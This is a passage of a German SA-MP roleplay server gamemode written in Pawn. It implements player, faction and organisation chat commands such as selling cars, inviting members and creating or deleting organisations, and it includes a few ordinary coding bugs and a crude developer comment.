			    }
			    else
			    {
			        SendClientMessage(playerid, COLOR_GREY, "   Dein Benzinkanister ist leer");
			    }
		    }
		    else
		    {
		        SendClientMessage(playerid, COLOR_GREY, "   Du bist in keinem Fahrzeug!");
		    }
		}
		return 1;
	}
	if(strcmp(cmd,"/delnewsrb", true) == 0)
    {
		if(PlayerInfo[playerid][sMember] == 9)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Du hast alle Sperren zerstört!");
			for(new user; user<MAX_PLAYERS; user++)
			{
			    for(new i=0; i<MAX_Objekt; i++)
				{
					DestroyDynamicObject(newsSperre[user][i]);
					newsSperre[user][i] = 0;
					newssperrespawned[i] = 0;
				}
			}
		}
		return 1;
	}
	if(strcmp(cmd,"/newsrb", true) == 0)
    {
		if(PlayerInfo[playerid][sMember] == 9)
		{
		    new Float:pRx;
			GetPlayerFacingAngle(playerid, pRx);
		    new Float:x, Float:y, Float:z;
		    GetPlayerPos(playerid, x, y, z);
			for(new i=0; i<MAX_newsObjekt; i++)
			{
				if(newsSperre[playerid][i] == 0)
				{
		 			newsSperre[playerid][i] = CreateDynamicObject(978, x, y, z, 0, 0, pRx+180); // Leitplanke
					newssperrespawned[playerid] ++;
				}
			}
		}
		return 1;
	}
	if(strcmp(cmd, "/givepaper", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(PlayerInfo[playerid][sMember] == 9)
	        {
	            if(PlayerInfo[playerid][sMember] == 9)
	            {
			        tmp = strtoknew(cmdtext, idx);
					if(!strlen(tmp))
					{
						SendClientMessage(playerid, COLOR_GRAD1, "Benutze: /givepaper [playerid]");
						return 1;
					}
			        giveplayerid = ReturnUser(tmp);
					if (IsPlayerConnected(giveplayerid))
					{
					    if(giveplayerid != INVALID_PLAYER_ID)
					    {
							if (ProxDetectorS(8.0, playerid, giveplayerid))
							{
								GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
								GetPlayerName(playerid, sendername, sizeof(sendername));
								format(string, sizeof(string), "* Du hast %s eine deiner Zeitungen angeboten.", giveplayer);
								SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
								format(string, sizeof(string), "* San News Reporter %s möchte dir eine Zeitung geben (gib /accept paper) ein um anzunehmen.", sendername);
								SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
								PaperOffer[giveplayerid] = playerid;
							}
						}
						else
						{
						    SendClientMessage(playerid, COLOR_GREY, "   Dieser Player ist nicht in deiner Nähe !");
					    	return 1;
						}
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "   Dieser Spieler ist Offline !");
					    return 1;
					}
				}
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GREY, "Du bist kein San News Mitglied!");
	            return 1;
			}
		}
		return 1;
	}
	if(strcmp(cmdtext, "/members", true)==0)
    {
        new frakname[128];
        new final[256], members313[800];
		format(final, sizeof(final), "ID\tName\tRang\tOnlinezeit\n");
		format(frakname,sizeof(frakname),"Fraktion/Gang: %s", GetPlayerFraktionName(playerid));
        if(PlayerInfo[playerid][pMember] > 0)
        {
            for(new i = 0; i < MAX_PLAYERS; i++)
            {
                if(IsPlayerConnected(i))
                {
                    new mymember;
                    mymember = PlayerInfo[playerid][pMember];
                    new myleader;
                    myleader = PlayerInfo[playerid][pMember];
					if(PlayerInfo[i][pMember] == mymember || PlayerInfo[i][pLeader] == myleader)
					{
						GetPlayerName(i, sendername, sizeof(sendername));
						format(members313, sizeof(members313), "%d\t%s\t%d\tin Minuten: %d\n", i,sendername, PlayerInfo[i][pRank], PlayerInfo[i][pMinutesSinceLogin]);
						strcat(final, members313);
					}
                }
            }
            ShowPlayerDialog(playerid, 6432, DIALOG_STYLE_TABLIST_HEADERS, frakname, final , "Ok", "");
            return 1;
        }
        if(PlayerInfo[playerid][pLeader] > 0)
        {
            for(new i = 0; i < MAX_PLAYERS; i++)
            {
                if(IsPlayerConnected(i))
                {
                    new mymember;
                    mymember = PlayerInfo[playerid][pLeader];
                    new myleader;
                    myleader = PlayerInfo[playerid][pLeader];
					if(PlayerInfo[i][pMember] == mymember || PlayerInfo[i][pLeader] == myleader)
					{
						GetPlayerName(i, sendername, sizeof(sendername));
						format(members313, sizeof(members313), "%d\t%s\t%d\tin Minuten: %d\n", i,sendername, PlayerInfo[i][pRank], PlayerInfo[i][pMinutesSinceLogin]);
						strcat(final, members313);
					}
                }
            }
            ShowPlayerDialog(playerid, 6432, DIALOG_STYLE_TABLIST_HEADERS, frakname, final , "Ok", "");
            return 1;
        }
        return 1;
    }
	if(strcmp(cmd, "/sellcar", true) == 0)
	{
		if(PlayerInfo[playerid][pLevel] < 2)
		{
			SendClientMessage(playerid, COLOR_GRAD1, "Du musst mindestens Level 2 sein, um dein Auto zu verkaufen.");
			return 1;
		}
	    if(IsPlayerConnected(playerid))
	    {
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD1, "NUTZUNG: /sellcar [Spieler ID / Name] [Preis]");
				return 1;
			}
			//giveplayerid = strval(tmp);
	        giveplayerid = ReturnUser(tmp);
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD1, "NUTZUNG: /sellcar [Spieler ID / Name] [Preis]");
				return 1;
			}
			moneys = strval(tmp);
			if(moneys < 1 || moneys > 50000000)
			{
			    SendClientMessage(playerid, COLOR_GRAD1, "Der Preis muss zwischen $1 und $50000000 sein!");
			    return 1;
			}
			if (IsPlayerConnected(giveplayerid))
			{
			    if(giveplayerid != INVALID_PLAYER_ID)
			    {
					if (ProxDetectorS(5.0, playerid, giveplayerid))
					{
						GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						playermoney = GetPlayerMoneySave(playerid);
     					if (moneys > 0 && playermoney >= moneys)
						{
                            if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "Du kannst dir nicht selber dein Auto verkaufen!"); return 1; }
							if(VehVerkauf[playerid] == 1)
							{
							SendClientMessage(playerid, COLOR_GREY, "Du hast bereits jemanden das Fahrzeug angeboten! Warte bis er akzeptiert!");
							return 1;
							}
							if(!Dtc_PlayerHaveCar[playerid][Dtc_PlayerKey[playerid]])
							{
							SendClientMessage(playerid, COLOR_GREY, "Du besitzt kein Fahrzeug auf diesem Schlüssel, /carkey");
							return 1;
							}
							CarDarfKeyNetChangen[playerid] = 1;
							CarPreisx[giveplayerid] = moneys;
							CarStatus[giveplayerid] = playerid;
							format(string, sizeof(string), "* Du bietest Spieler: %s dein Fahrzeug: %s für %d Doller an.", giveplayer,CarName[PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarModel]-400],moneys);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Warte bis er akzeptiert!");
							format(string, sizeof(string), "* Spieler: %s bietet dir sein Fahrzeug: %s für %d Doller an.", sendername, CarName[PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarModel]-400],moneys);
							SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
							SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, "* Tippe: /accept car");
							VehVerkauf[playerid] = 1;

						}
						else
						{
							SendClientMessage(playerid, COLOR_GRAD1, "Ungültiger Betrag.");
						}
					}
					else
					{
						SendClientMessage(playerid, COLOR_GRAD1, "Du musst näher an dem Spieler sein!");
					}
				}//invalid id
			}
			else
			{
				format(string, sizeof(string), "%d ist kein aktiver Spieler.", giveplayerid);
				SendClientMessage(playerid, COLOR_GRAD1, string);
			}
		}
		return 1;
	}






	if (strcmp("/spawnall", cmdtext, true, 10) == 0)
	{
		if(PlayerInfo[playerid][pAdmin] >= 1)
		{
		  	  for(new i = 0; i < MAX_PLAYERS; i++)
		   	  {
				SpawnPlayer(i);
				SetPlayerColor(i, 0xFFFFFF00);
				new rand = random(30);
		        PlayerInfo[i][pLevel] = rand;
				SetPlayerScore(i,rand);
		      }
    	}
	  return 1;
	}
    if (strcmp("/freecar", cmdtext, true, 10) == 0)
    {
		    if (IsPlayerInRangeOfPoint(playerid, 7.0, 925.6982,-1207.2606,17.0394))
		    {
				ShowPlayerDialog(playerid, DIALOG_AUSWAHL33, DIALOG_STYLE_LIST, "Welches Fahrzeug möchtest du Freikaufen ?", "Privatfahrzeug\nFraktionsfahrzeug", "Auswählen", "Abbrechen");
			}
	 		else
		    {
			SendClientMessage(playerid, COLOR_GRAD1, "Du bist nicht bei dem Ordnungsamt!");
			return 1;
			}
 			return 1;
	}
	if(strcmp(cmd, "/umfrage", true) == 0)
	{
		if(IsPlayerConnected(playerid))
		{
			if(PlayerInfo[playerid][pAdmin] >= 3)
			{
				GetPlayerName(playerid, sendername, sizeof(sendername));
				new length = strlen(cmdtext);
				while ((idx < length) && (cmdtext[idx] <= ' '))
			{
			idx++;
		}
		new offset = idx;
		new result[90];
		while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
	{
	result[idx - offset] = cmdtext[idx];
	idx++;
	}
	result[idx - offset] = EOS;
	if(!strlen(result))
	{
	SendClientMessage(playerid, COLOR_GRAD2, "Benutze: /umfrage [text]");
	return 1;
	}
		for(new i=0; i<MAX_PLAYERS; i++)
		{
            if(gPlayerLogged[i] == 1)
            {
		        DialogShowed[i] = 1;
				ShowPlayerDialog(i,4221, DIALOG_STYLE_INPUT, "Umfrage", result, "Bestätigen", "Verlassen");
            }
		}
	}
	else
	{
	SendClientMessage(playerid, COLOR_GREY, " Du bist kein Admin!");
	}
	}//not connected
	return 1;
	}
	if(strcmp(cmd, "/gutschein", true) ==0)
	{
//		SendClientMessage(playerid, COLOR_GREY, " Aufgrund Debugzwecke deaktiviert");
		ShowPlayerDialog(playerid,5614,DIALOG_STYLE_INPUT,"Gutschein","Bitte gebe nun den Gutschein Code ein!","Absenden","Abbrechen");
		return 1;
	}
	if(strcmp(cmd, "/creategift", true) == 0)
	{
		if(PlayerInfo[playerid][pAdmin] == 2002)
		{
			ShowPlayerDialog(playerid, creategutschein, DIALOG_STYLE_LIST, "Wähle den Typ des Gutscheines", "Unterbodenbeleuchtung\n20 RP\nPremium Permanent\nWunschkennzeichen\nWunschfahrzeug\nSonderlackierung", "Erstellen", "Abbrechen");
		}
		return 1;
	}

	// /gutschein Liste einführen wo man seine Gutscheine sieht











/*


		    tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "BEFEHL:/punkte [Spieler][Anzahl][Grund]");
				return 1;
			}
*/
/*

if(strcmp(cmd, "/invite", true) == 0)
    {
        tmp = strtoknew(cmdtext, idx);
        if(!strlen(tmp))
        {
            SendClientMessage(playerid, COLOR_GRAD2, "Fehler: /invite [ID/Name]");
            return 1;
        }
        new leader = PlayerInfo[playerid][pLeader];
        new para1 = ReturnUser(tmp);
        if (PlayerInfo[playerid][pLeader] >= 1)
        {
            if(IsPlayerConnected(para1))
            {
                if(para1 != INVALID_PLAYER_ID)
                {
                    if (gTeam[para1]==TEAM_GREEN && PlayerInfo[para1][pMember] == 0 && PlayerInfo[para1][pFMember] == 255)
                    {
                        if(PlayerInfo[para1][pFrakSperre] == 0)
                        {
                            GetPlayerName(para1, giveplayer, sizeof(giveplayer));
                            GetPlayerName(playerid, sendername, sizeof(sendername));
                            printf("AdmCmd: %s hat %s in die Fraktion %s eingeladen.", sendername, giveplayer,Fracs[leader-1]);
                            format(string, sizeof(string), "Die Fraktion %s möchte dich aufnehmen. (eingeladen von %s)",Fracs[leader-1], sendername);
                            SendClientMessage(para1, COLOR_LIGHTBLUE, string);
                            SendClientMessage(para1, COLOR_GRAD2, "Um der Fraktion beizutreten, nutze /accept invite");
                            //SendClientMessage(para1, COLOR_GRAD2, " Um die Einladung abzulehnen: /einladung ablehnen");
                            format(string, sizeof(string), "   Du hast %s in die Fraktion %s eingeladen.", giveplayer,Fracs[leader-1]);
                            SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                            SendClientMessage(playerid, COLOR_GRAD2, "Du hast %s in die Fraktion eingeladen.");
                            new iyear, imonth,iday;
                            getdate(iyear, imonth, iday);
                            format(string, sizeof(string), "%s[Level:%d] wurde von %s in die Fraktion %s eingeladen (%d-%d-%d)", giveplayer,PlayerInfo[para1][pLevel],sendername,Fracs[leader-1],imonth,iday,iyear);
                            MemberLog(string);
                            Eingeladen[para1] = leader;
                        }
                        else
                        {
                            SendClientMessage(playerid, COLOR_GREY, "  Dieser Spieler hat eine Fraktions-Sperre");
                            return 1;
                        }
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_GREY, "  Dieser Spieler ist in einer anderen Fraktion oder bereits ein Fraktionsmitglied.");
                        return 1;
                    }
                }
            }//not connected
        }
        else
        {
            SendClientMessage(playerid, COLOR_GRAD1, "Nur der CO/Leader kann diesen Befehl benutzen.");
        }
        return 1;
    }


*/


	if(strcmp(cmd, "/invite", true) == 0)
	{
		tmp = strtoknew(cmdtext, idx);
		if(!strlen(tmp))
		{
			SendClientMessage(playerid, COLOR_GRAD2, "Benutzung: /invite [playerid/Name]");
			return 1;
		}
		new leader = PlayerInfo[playerid][pLeader];
		new para1 = ReturnUser(tmp);

        if(PlayerInfo[playerid][pLeader] > 0)
		{
		    if(IsPlayerConnected(para1))
		    {
		        if(para1 != INVALID_PLAYER_ID)
		        {
				    if (gTeam[para1]==TEAM_GREEN && PlayerInfo[para1][pMember] == 0 && PlayerInfo[para1][pFMember] == 255)
				    {
						if(PlayerInfo[para1][pFrakSperre] == 0)
						{
						    if(GetDistanceBetweenPlayers(playerid,para1) <= 8)
							{
							   // if(PlayerInfo[playerid][FraktionsSperre(Fracs[leader+1])) return SCM(playerid,-1,"Du hast eine Sperre bei dieser Fraktion.");

							    if(leader == 1 || leader == 2|| leader == 3 || leader == 22)
								{
								    if(PlayerInfo[para1][pLevel]<5)
								    {
										return SCM(playerid,-1,"Der Spieler braucht mindestens Level 5!");
									}
								}
								printf("AdmCmd: %s hat %s in die Fraktion %s eingeladen.", sendername, giveplayer,Fracs[leader-1]);
								GetPlayerName(para1, giveplayer, sizeof(giveplayer));
								GetPlayerName(playerid, sendername, sizeof(sendername));
								format(string, sizeof(string), "   Du wurdest in die Fraktion %s von Leader %s eingeladen.",Fracs[leader-1], sendername);
								SendClientMessage(para1, COLOR_LIGHTBLUE, string);
	                            new dialogText[128];
	                            format(dialogText,sizeof(dialogText),"%s von der Fraktion %s Möchte dich als Member aufnehmen",sendername,Fracs[leader-1]);
	                            ShowPlayerDialog(para1,DIALOG_INVITE,DIALOG_STYLE_MSGBOX,"Einladung",dialogText,"Annehmen","Ablehnen");
								format(string, sizeof(string), "   Du hast %s in die Fraktion %s eingeladen.", giveplayer,Fracs[leader-1]);
								SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
								SendClientMessage(playerid, COLOR_GRAD2, " Der Spieler muss nun deine Einladung annehmen oder ablehnen.");
								new iyear, imonth,iday;
								getdate(iyear, imonth, iday);
								format(string, sizeof(string), "%s[Level:%d] wurde von %s in die Fraktion %s eingeladen (%d-%d-%d)", giveplayer,PlayerInfo[para1][pLevel],sendername,Fracs[leader-1],imonth,iday,iyear);
								MemberLog(string);
								Eingeladen[para1] = leader;


								//if(PlayerInfo[playerid][FraktionsSperre][leader+1] == 1) return SCM(playerid,-1,"Du hast eine Sperre bei dieser Fraktion.");

							}
							else
							{
							    SendClientMessage(playerid, COLOR_GREY, "  Der Spieler ist nicht in deiner Nähe!");
							    return 1;
							}
						}
						else
						{
						    SendClientMessage(playerid, COLOR_GREY, "  Dieser Spieler hat eine Fraktions-Sperre");
						    return 1;
						}
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "  Dieser Spieler ist in einer anderen Fraktion oder bereits ein Fraktionsmitglied.");
					    return 1;
					}
				}
			}//not connected
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Leader!");
		}
		return 1;
	}







	if(strcmp(cmd,"/akillfire", true) == 0) // jobchat
	{
	    if(PlayerInfo[playerid][pAdmin] > 1338)
	    {
			for(new i=0;i<MAX_FLAMES;i++)
			{
			 	KillFire(i);
			}
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Du hast alle Feuer gelöscht!");
		}
		return 1;
	}
	if(strcmp(cmd,"/organisationen", true) == 0) // jobchat
	{
		new count;
	    if(PlayerInfo[playerid][pAdmin] > 1338)
	    {

		    for(new org=1;org<MAX_ORGANISATIONS;org++)
			{
				if(OrgInfo[org][OrgCreatet] != 0)
				{
					format(string,sizeof(string),"%i. %s : Motto: %s,Gründer: %s\n%s",org,OrgInfo[org][OrgName],OrgInfo[org][OrgMotto],OrgInfo[org][OrgOwner],string);
				    ShowPlayerDialog(playerid,5322,DIALOG_STYLE_MSGBOX,"{FFFFFF}: Organisationen",string,"Verlassen","");
					count++;
				}
			}
		}
		if(count == 0)return SendClientMessage(playerid,COLOR_GREY,"Es wurden keine Organisationen erstellt.");
		return 1;
	}
	if(strcmp(cmd,"/orghelp", true) == 0) // jobchat
	{
	    new org = PlayerInfo[playerid][pOrgMember];
		if(org == 0)return SendClientMessage(playerid,COLOR_GREY,"Du bist in keiner Organisation.");
		format(string,sizeof(string),"{FFFFFF}Organisation: %s\n",OrgInfo[org][OrgName]);
		format(string,sizeof(string),"%s{FFFFFF}Motto: %s\n",string,OrgInfo[org][OrgMotto]);
		format(string,sizeof(string),"%s{FFFFFF}Besitzer: %s\n\n",string,OrgInfo[org][OrgOwner]);
		strcat(string,"{FFFFFF}Chat:{C9C9C9} /org\n");
		strcat(string,"{FFFFFF}Liste:{C9C9C9} /orgmember\n");
		strcat(string,"{FFFFFF}Verlassen:{C9C9C9} /orgleave\n");
		if(PlayerInfo[playerid][pOrgLeader] == org)
		{
			strcat(string,"Leader:{C9C9C9}\n");
		    strcat(string,"{FFFFFF}/orginvite,/orguninvite,/orgsetleader,/orgsetmotto,/orgname,");
		    strcat(string,"{FFFFFF}/orgdelete");
		}
		ShowPlayerDialog(playerid,4342,DIALOG_STYLE_MSGBOX,"{FFFFFF} Organisationshilfe",string,"Zurück","Abbrechen");
		return 1;
	}
	if(strcmp(cmd, "/org", true) == 0)// Org Rangnamen einführen
	{
		if(PlayerInfo[playerid][pOrgMember] == 0)return SendClientMessage(playerid,COLOR_GREY,"Du bist in keiner Organisation.");

			GetPlayerName(playerid, sendername, sizeof(sendername));
			new length = strlen(cmdtext);
			while ((idx < length) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offset = idx;
//			new ajjhfudw[240];
			new result[240];
			while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
			{
				result[idx - offset] = cmdtext[idx];
				idx++;
			}
			result[idx - offset] = EOS;
			if(!strlen(result))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "NUTZE: (/org [org chat]");
				return 1;
			}

		format(string,sizeof(string),"**(( %s: %s ))**",GetName(playerid),result);
		for(new i=0; i<MAX_PLAYERS; i++)
		{
			if(IsPlayerConnected(i) && !IsPlayerNPC(i))
			{
	    	    if(gPlayerLogged[playerid] == 1)
	     	    {
					if(PlayerInfo[i][pOrgMember] == PlayerInfo[playerid][pOrgMember])
					{
						SendClientMessage(i,COLOR_PURPLE,string);
					}
				}
			}
		}

		return 1;
	}

	if(strcmp(cmd,"/orgmember", true) == 0) // jobchat
	{
		new onlinemembers = 0,org = PlayerInfo[playerid][pOrgMember];
	    if(org == 0)return SendClientMessage(playerid,COLOR_GREY,"Du bist in keiner Organisation.");
		for(new i=0; i<MAX_PLAYERS; i++)
		{
			if(IsPlayerConnected(i) && !IsPlayerNPC(i))
			{
	    	    if(gPlayerLogged[playerid] == 1)
	     	    {
					if(PlayerInfo[i][pOrgMember] == org)
					{
						format(string,sizeof(string),"%s (ID:%i)\n%s",GetName(i),i,string);
						onlinemembers++;
					}
				}
			}
		}

		if(onlinemembers == 0)return SendClientMessage(playerid,COLOR_GREY,"Kein Organisationsmitglied Online.");
		else return ShowPlayerDialog(playerid,4232,DIALOG_STYLE_LIST,OrgInfo[org][OrgName],string,"Verlassen","");
	}


	if(strcmp(cmd,"/orgcreate", true) == 0) // jobchat
	{
			GetPlayerName(playerid, sendername, sizeof(sendername));
			new length = strlen(cmdtext);
			while ((idx < length) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offset = idx;
//			new ajjhfudw[240];
			new result[240];
			while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
			{
				result[idx - offset] = cmdtext[idx];
				idx++;
			}
			result[idx - offset] = EOS;
			if(!strlen(result))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "BENUTZE: /orgcreate [Name]");
				return 1;
			}

		if(!IsPlayerInRangeOfPoint(playerid,1.0,358.8627,182.6243,1008.3828))return SendClientMessage(playerid,COLOR_GREY,"Du bist nicht am Organisations-Verwaltungsamt.");

		if(GetPlayerMoneySave(playerid) < 350000) return SCM(playerid,-1,"Du besitzt nicht genug Geld! (350.000€)");
		if(PlayerInfo[playerid][pLevel] <5) return SCM(playerid,-1,"Du benötigst mindestens Level 5 um eine Organisation gründen zu können!");
		if(strlen(result) > 30)return SendClientMessage(playerid,COLOR_GREY,"BENUTZE: /orgcreate [Name darf maximal 30 Zeichen beinhalten]");
	//	if(GetPlayerMoneySave(playerid) -350000) < 0)return SendClientMessage(playerid,COLOR_GREY,"Nicht genug Geld dabei (500000$).");
		if(PlayerInfo[playerid][pOrgLeader] != 0)return SendClientMessage(playerid,COLOR_GREY,"Du bist schon Leader einer Organisation.");
		if(PlayerInfo[playerid][pOrgMember] != 0)return SendClientMessage(playerid,COLOR_GREY,"Du bist schon Mitglied einer Organisation.");
		GivePlayerMoneySave(playerid,-350000);
		CreateOrganisation(result,playerid);
		return 1;
	}
	if(strcmp(cmd,"/orgname", true) == 0) // jobchat
	{
			GetPlayerName(playerid, sendername, sizeof(sendername));
			new length = strlen(cmdtext);
			while ((idx < length) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offset = idx;
//			new ajjhfudw[240];
			new result[240];
			while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
			{
				result[idx - offset] = cmdtext[idx];
				idx++;
			}
			result[idx - offset] = EOS;
			if(!strlen(result))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "BENUTZE: /orgname [Name]");
				return 1;
			}

			// Länge darf nicht über 30 sein

		new org = PlayerInfo[playerid][pOrgLeader];
		if(org == 0)return SendClientMessage(playerid,COLOR_GREY,"Du bist in keiner Organisation Leader.");

		strmid(OrgInfo[org][OrgName],result,0,strlen(result),32);
		format(string,sizeof(string),"Du hast den Namen der Organisation in '%s' umgeändert.",OrgInfo[org][OrgName]);
		SendClientMessage(playerid,COLOR_YELLOW,string);
		format(string,sizeof(string),"%s hat den Namen der Organisation in '%s' umgeändert.",PlayerInfo[playerid][Name],OrgInfo[org][OrgName]);
		SendOrganisationsMessage(org,COLOR_PURPLE,string);
		return 1;
	}
	if(strcmp(cmd,"/orgdelete", true) == 0) // jobchat
	{
		new org = PlayerInfo[playerid][pOrgMember];
	    if(org == 0)return SendClientMessage(playerid,COLOR_GREY,"Du bist in keiner Organisation.");
	//	if(org == 0)return SendClientMessage(playerid,COLOR_GREY,"Du bist in keiner Organisation Leader.");
	//	if(strcmp(PlayerInfo[playerid][Name],OrgInfo[org][OrgOwner],true) == 0)
	    if(!strcmp(OrgInfo[org][OrgOwner], GetName(playerid), true))
		{
			format(string,sizeof(string),"Du hast die Organisation '%s' aufgelöst.",OrgInfo[org][OrgName]);
			SendClientMessage(playerid,COLOR_YELLOW,string);
			format(string,sizeof(string),"%s hat die Organisation '%s' aufgelöst.",PlayerInfo[playerid][Name],OrgInfo[org][OrgName]);

			for(new i=0; i<MAX_PLAYERS; i++)
			{
				if(IsPlayerConnected(i) && !IsPlayerNPC(i) && (	PlayerInfo[i][pOrgLeader] == org || PlayerInfo[playerid][pOrgMember] == org))
				{
					SendClientMessage(i,COLOR_PURPLE,string);
					PlayerInfo[i][pOrgLeader] = 0;
					PlayerInfo[i][pOrgMember] = 0;
				}
			}
	//		format(string,sizeof(string),"SELECT * FROM accounts WHERE pOrgMember='%d'",org);
	//	    mysql_function_query(mysqlcon,string,true,"OnQueryFinish","siii",string,_SQL_REMOVEACCSFROMORG,playerid,MySqlConnection);

	        format(string,sizeof(string),"DELETE FROM `organisations` WHERE `organisations`.`id` = %d",org);
		   // mysql_function_query(mysqlcon,string,false,"","");
		    mysql_pquery(mysqlcon, string);

		    OrgInfo[org][OrgCreatet] = 0;
			strmid(OrgInfo[org][OrgName],"Keinen",0,strlen("Keinen"),32);
			strmid(OrgInfo[org][OrgOwner],"Keinen",0,strlen("Keinen"),24);
			strmid(OrgInfo[org][OrgMotto],"Keins",0,strlen("Keins"),128);
			return 1;
		}
		else return SendClientMessage(playerid,COLOR_GREY,"Du bist nicht der Besitzer der Organisation.");
	}
	if(strcmp(cmd,"/orgleave", true) == 0) // jobchat
	{
		new org = PlayerInfo[playerid][pOrgMember];
	    if(org == 0) return SendClientMessage(playerid,COLOR_GREY,"Du bist in keiner Organisation.");
	    if(strcmp(PlayerInfo[playerid][Name],OrgInfo[org][OrgOwner],false) == 0)return SendClientMessage(playerid,COLOR_GREY,"Du kannst deine Organisation als Owner nicht eigenhändig verlassen. Nutze /orgdelete"); //vll noch /orgnewowner
		format(string,sizeof(string),"%s hat die Organisation '%s' verlassen.",GetName(playerid));
		SendOrganisationsMessage(org,COLOR_PURPLE,string);
		PlayerInfo[playerid][pOrgLeader] = 0;
		PlayerInfo[playerid][pOrgMember] = 0;
		return 1;
	}
	if(strcmp(cmd, "/orginvite", true) == 0)
	{
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Benutzung: /orginvite [playerid/Name]");
				return 1;
			}
//			new leader = PlayerInfo[playerid][pLeader];
            if(PlayerInfo[playerid][pOrgMember]==0) return SendClientMessage(playerid,COLOR_GREY,"Du bist in keiner Organisation.");


			new para1 = ReturnUser(tmp);
		    if(IsPlayerConnected(para1))
		    {
		        if(para1 != INVALID_PLAYER_ID)
		        {
					if(GetDistanceBetweenPlayers(playerid,para1) <= 8)
					{
			   	   		if(para1 == playerid)
			   		    {
						SendClientMessage(playerid,COLOR_GREY,"Du kannst dich nicht selber inviten.");
						return 1;
						}


						if(PlayerInfo[para1][pOrgMember] >0)
						{

						SendClientMessage(playerid,COLOR_GREY,"Der Spieler ist bereits in einer Organisation");
						return 1;
						}

						// /invite /makeleader Bug ? Member und Frak getrennt

						new org = PlayerInfo[playerid][pOrgMember];
					    if(!strcmp(OrgInfo[org][OrgOwner], GetName(playerid), true))     //return SendClientMessage(playerid,COLOR_GREY,"Du bist in keiner Organisation Leader."); //orgowner bafrage
						{


// Bei OrgInfo[org] könte es ein prob sein das ja jeder leade rof 0 ist oder so KA kann ich scripten du hurensohn?
					    if(PlayerInfo[para1][pOrgMember] >= 1)return SendClientMessage(playerid,COLOR_GREY,"Der Spieler ist bereits in einer Organisation");

                        if(PlayerInfo[para1][pOrgLeader] >= 1)return SendClientMessage(playerid,COLOR_RED,"Der Spieler ist bereits Leader in einer ORG. Bitte melde dies dem Support.");

						if(!IsPlayerConnected(para1))return SendClientMessage(playerid,COLOR_GREY,"Der angegebene Spieler ist nicht eingeloggt!");

						if(PlayerInfo[para1][pOrgMember] == org)return SendClientMessage(playerid,COLOR_GREY,"Der angegebene Spieler ist bereits in deiner Organisation Mitglied.");

						new Fukkckcky[128];
						format(Fukkckcky,sizeof(Fukkckcky),"%s von der Organisation %s Möchte dich als Member aufnehmen",GetName(playerid),OrgInfo[org][OrgName]);
						ShowPlayerDialog(para1,DIALOG_ORGINVITE,DIALOG_STYLE_MSGBOX,"Einladung",Fukkckcky,"Annehmen","Ablehnen");// Orgname in einer Variable von dem Orgleader speichern!

						EingeladenORG[para1] = org; // das fixxnen wär schlecht wenn man gleichzeitig von ner org und frak eingeladen würd,e vlt bug  /// Erledigt

						format(string,sizeof(string),"Du hast %s (ID:%i) eine Einladung in deine Organisation gesendet.",GetName(para1),para1);
						SendClientMessage(playerid,COLOR_LIGHTBLUE,string);
						}
						else
						{
						    if(PlayerInfo[playerid][pOrgLeader] != org) return SCM(playerid,-1,"Du bist nicht Leader dieser ORG!");
						    else
						    {
		         				if(PlayerInfo[para1][pOrgMember] > 1)return SendClientMessage(playerid,COLOR_GREY,"Der Spieler ist bereits in einer Organisation");


								if(!IsPlayerConnected(para1))return SendClientMessage(playerid,COLOR_GREY,"Der angegebene Spieler ist nicht eingeloggt!");

								if(PlayerInfo[para1][pOrgMember] == org)return SendClientMessage(playerid,COLOR_GREY,"Der angegebene Spieler ist bereits in deiner Organisation Mitglied.");
                                new Fukkckcky[128];
								format(Fukkckcky,sizeof(Fukkckcky),"%s von der Organisation %s Möchte dich als Member aufnehmen",GetName(para1),OrgInfo[org][OrgName]);
								ShowPlayerDialog(para1,DIALOG_ORGINVITE,DIALOG_STYLE_MSGBOX,"Einladung",Fukkckcky,"Annehmen","Ablehnen");// Orgname in einer Variable von dem Orgleader speichern!

								EingeladenORG[para1] = org;

								format(string,sizeof(string),"Du hast %s (ID:%i) eine Einladung in deine Organisation gesendet.",GetName(para1),para1);
								SendClientMessage(playerid,COLOR_LIGHTBLUE,string);
							}
						}

				}
				else
				{
				SendClientMessage(playerid, COLOR_GRAD2, "Der Spieler ist nicht in der Nähe");
				}
			}
		}
		return 1;
	}



	if(strcmp(cmd, "/orguninvite", true) == 0)
	{
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
